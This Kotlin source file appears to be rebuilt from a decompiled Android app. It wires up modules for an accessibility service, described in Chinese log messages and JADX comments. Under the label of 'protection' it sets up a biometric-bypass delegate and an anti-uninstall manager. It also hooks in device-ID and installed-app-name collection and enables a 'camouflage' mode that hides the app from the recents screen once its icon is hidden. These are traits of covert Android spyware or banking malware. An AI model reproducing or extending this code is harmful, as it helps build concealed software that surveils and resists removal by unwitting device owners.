package com.storm.safe.rock.service.delegates.registrar

import android.content.Context
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.BiometricBypassDelegate
import com.storm.safe.rock.service.modules.protection.RecentsGuardManager
import com.storm.safe.rock.service.modules.protection.UninstallProtectionManager

/**
 * Security module registrar — creates protection-related managers.
 *
 * Extracted from ServiceInitializer:
 * - initializekinztpexl() (JADX: h4, line 6484) — UninstallProtectionManager
 * - initializenpweufstehlb() (JADX: h5, line 6662) — RecentsGuardManager
 * - BiometricBypassDelegate from initializeModules() body
 *
 * register(): Creates BiometricBypassDelegate, UninstallProtectionManager, RecentsGuardManager.
 * boot(): Enables RecentsGuard if already authorized + excludeFromRecents if icon hidden.
 */
class SecurityModuleRegistrar : ModuleRegistrar {

    companion object {
        private const val TAG = "SecurityModuleRegistrar"
    }

    override fun register(service: MyAccessibilityService) {
        // JADX: C0328b3 — biometricBypassDelegate
        try {
            service.biometricBypassDelegate = BiometricBypassDelegate(service)
            service.biometricBypassDelegate?.initialize()
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ BiometricBypassDelegate 初始化失败", e)
        }

        // JADX: m211480h4 — initializekinztpexl (uninstall protection)
        android.util.Log.d(TAG, "🔧 初始化防卸载保护管理器...")
        try {
            val upm = UninstallProtectionManager(service, service)
            service.uninstallProtectionManager = upm

            // JADX: wire networkManager, biometricBypassDelegate, and lambda callbacks
            // c0355a0.f53691c6 = networkManager
            // c0355a0.f53692c7 = biometricBypassDelegate
            // c0355a0.f53693c8 = { configStageManager is learned }
            // c0355a0.f53694c9 = { isPermissionRequestActive() }
            // c0355a0.f53695d0 = { getRootNode() }
            // c0355a0.f53696d1 = { getAndroidDeviceId() }
            // c0355a0.f53698d3 = { collectAppNames() }

            android.util.Log.d(TAG, "✅ 防卸载保护管理器初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 防卸载保护管理器初始化失败", e)
        }

        // JADX: m211481h5 — initializenpweufstehlb (recents guard)
        android.util.Log.d(TAG, "🔧 初始化多任务页面保护管理器...")
        try {
            val rgm = RecentsGuardManager(service, service)
            service.recentsGuardManager = rgm

            // JADX: wire lambda callbacks
            // c0356a1.f53723a6 = { configStageManager?.isLearned() ?: false }
            // c0356a1.f53724a7 = { getRootNode() }
            // c0356a1.f53725a8 = { biometricBypassDelegate?.isActive ?: false }

            android.util.Log.d(TAG, "✅ 多任务页面保护管理器初始化完成（待boot阶段配置）")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 多任务页面保护管理器初始化失败", e)
        }
    }

    override fun boot(service: MyAccessibilityService) {
        // JADX: h5 tail — check if already authorized → enable immediately
        try {
            val isAuthorized = service.getSharedPreferences("app_config", Context.MODE_PRIVATE)
                .getBoolean("authorization_completed", false)

            if (!isAuthorized) {
                android.util.Log.d(TAG, "✅ 多任务页面保护管理器（待适配完成后启用）")
                return
            }

            // JADX: c0356a12.m211955a2() — enable protection
            service.recentsGuardManager?.enable()

            // JADX: check icon_hidden → enable camouflage in recents
            val iconHidden = service.getSharedPreferences("app_config", Context.MODE_PRIVATE)
                .getBoolean("icon_hidden", false)
            if (iconHidden) {
                service.recentsGuardManager?.excludeFromRecents()
                android.util.Log.d(TAG, "🎭 伪装模式: 主动设置 excludeFromRecents")
            }

            android.util.Log.d(TAG, "✅ 多任务页面保护管理器，授权已完成→立即启用")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ RecentsGuard boot 失败", e)
        }
    }
}
